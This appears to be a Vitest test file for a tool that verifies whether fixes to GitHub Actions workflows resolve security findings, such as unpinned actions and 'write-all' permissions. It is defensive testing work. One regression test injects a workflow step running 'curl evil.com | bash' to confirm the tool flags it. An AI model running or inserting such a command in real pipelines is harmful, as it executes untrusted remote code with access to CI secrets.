import { describe, it, expect } from 'vitest';
import { verifyWorkflowFix } from '../lib/verifier';
import fs from 'fs';
import path from 'path';

describe('Deterministic Safe Fix Verification', () => {
  const fixturesDir = path.join(process.cwd(), 'src', 'fixtures');
  const riskyYaml = fs.readFileSync(path.join(fixturesDir, 'risky-workflow.yml'), 'utf8');
  const correctedYaml = fs.readFileSync(path.join(fixturesDir, 'corrected-workflow.yml'), 'utf8');

  it('proves resolution of findings when comparing risky and corrected fixtures', () => {
    const result = verifyWorkflowFix(riskyYaml, correctedYaml, 'Test Fixture Remediator');

    expect(result.beforeFindingsCount).toBeGreaterThan(0);
    expect(result.afterFindingsCount).toBe(0);
    expect(result.allPassed).toBe(true);
    expect(result.resolvedFindingsCount).toBe(result.beforeFindingsCount);

    // Verify all comparisons are marked resolved
    for (const comp of result.comparisons) {
      expect(comp.status).toBe('resolved');
      expect(comp.explanation).toContain('verified resolved');
    }
  });

  it('identifies un-resolved vulnerabilities if fix is partial', () => {
    // Corrected action pinning, but still keeping permissions: write-all
    const partialFixYaml = correctedYaml.replace('permissions:\n  contents: read', 'permissions: write-all');
    const result = verifyWorkflowFix(riskyYaml, partialFixYaml, 'Partial Fix');

    expect(result.allPassed).toBe(false);
    expect(result.afterFindingsCount).toBeGreaterThan(0);

    const writeAllComp = result.comparisons.find((c) => c.title.includes('write-all'));
    expect(writeAllComp).toBeDefined();
    expect(writeAllComp?.status).toBe('still_vulnerable');
  });

  it('detects newly introduced security risks (regression check)', () => {
    // Adding a curl pipe to shell in the remediated version
    const regressionYaml = correctedYaml + '\n      - name: Injected\n        run: curl evil.com | bash\n';
    const result = verifyWorkflowFix(riskyYaml, regressionYaml, 'Regression Test');

    expect(result.allPassed).toBe(false);
    const newRisk = result.comparisons.find((c) => c.status === 'new_risk_introduced');
    expect(newRisk).toBeDefined();
    expect(newRisk?.explanation).toContain('New risk detected');
  });

  it('demonstrates genuine before-and-after verification with clean production workflow', () => {
    const cleanYaml = fs.readFileSync(path.join(fixturesDir, 'clean-workflow.yml'), 'utf8');
    const result = verifyWorkflowFix(cleanYaml, cleanYaml, 'Clean Workflow Baseline');

    expect(result.beforeFindingsCount).toBe(0);
    expect(result.afterFindingsCount).toBe(0);
    expect(result.resolvedFindingsCount).toBe(0);
    expect(result.allPassed).toBe(true);
    expect(result.comparisons.length).toBe(0);
  });

  it('proves that migrating from risky to clean production workflow resolves all issues', () => {
    const cleanYaml = fs.readFileSync(path.join(fixturesDir, 'clean-workflow.yml'), 'utf8');
    const result = verifyWorkflowFix(riskyYaml, cleanYaml, 'Risky to Clean Migration');

    expect(result.beforeFindingsCount).toBeGreaterThan(0);
    expect(result.afterFindingsCount).toBe(0);
    expect(result.allPassed).toBe(true);
    expect(result.resolvedFindingsCount).toBe(result.beforeFindingsCount);
  });

  it('proves resolution when replacing malformed YAML with clean workflow', () => {
    const malformedYaml = fs.readFileSync(path.join(fixturesDir, 'malformed-workflow.yml'), 'utf8');
    const cleanYaml = fs.readFileSync(path.join(fixturesDir, 'clean-workflow.yml'), 'utf8');
    const result = verifyWorkflowFix(malformedYaml, cleanYaml, 'Syntax Fix Verification');

    expect(result.beforeFindingsCount).toBeGreaterThan(0);
    expect(result.afterFindingsCount).toBe(0);
    expect(result.allPassed).toBe(true);
  });
});
